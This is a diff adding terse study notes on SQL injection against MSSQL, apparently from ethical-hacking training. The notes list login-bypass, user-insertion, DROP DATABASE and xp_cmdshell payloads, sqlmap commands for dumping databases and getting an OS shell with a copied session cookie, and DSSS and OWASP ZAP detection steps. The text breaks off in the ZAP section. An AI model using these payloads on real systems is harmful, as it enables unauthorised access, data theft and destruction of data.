@@ -1,0 +1,44 @@
+SQL Injection
+Perform section 2 first(use ZAP)
+	
+	1. SQL injection attacks
+		○ SQL injection attack on an MSSQL database
+			§ For logins try any of the following 
+				Username: 	' or 1=1 --'
+				Password:	<blank>
+				
+			§ Creating new user
+				Username:	';insert into login values ('greg','password'); --
+			§ Create a new database-named mydatabase
+				Username:	';create database mydatabase; --
+			§ Delete data base
+				Username:	';DROP DATABASE mydatabase; --
+				Username:	';DROP TABLE mytable;--
+			§ Execute Commands remotely
+				Username:	';exec master..xp_cmdshell '<command here>'; --
+        
+		○  SQL injection attack against MSSQL to extract databases using sqlmap
+			§ Opensource testing tool to test sql weakness
+			§ Enforces sql injection techniques
+			1. Find a URL with a 'id=". 
+			2. Open the source code of the web page 
+				Click the Console tab
+				Type/search for "document.cookie" and copy this key
+        
+			3. Perform the following actions with parrot box
+				$sqlmap -u "<url.com/id=1> " --cookie="<cookie.from.step3>" --dbs
+				--dbs	Returnes database/OS info /and webapp
+				-D <specifies Database> --tables	Returns tables of the specified DBs
+				-D <specifies Database> -T<Specifies table>	Returns the attribute of the table
+				--dump	Returns all info of DB
+				--os-shell	Gives the user shell access
+					>TASKLIST - returnes all services
+          
+	2. Detect SQL injection vulnerabilities 
+		○ DSSS Detect SQL injection vulnerabilities 
+			§ Helps discover vulnerable sql servers 
+			$cd dss
+			$python3 dsss.py -u <urls.com/id=1> --cookie=<>
+			This will result in a output of an URL with more users/ services exposed
+		○ OWASP ZAP:Detect SQL injection vulnerabilities 
+			§ Need to set up the Proxy to internal 
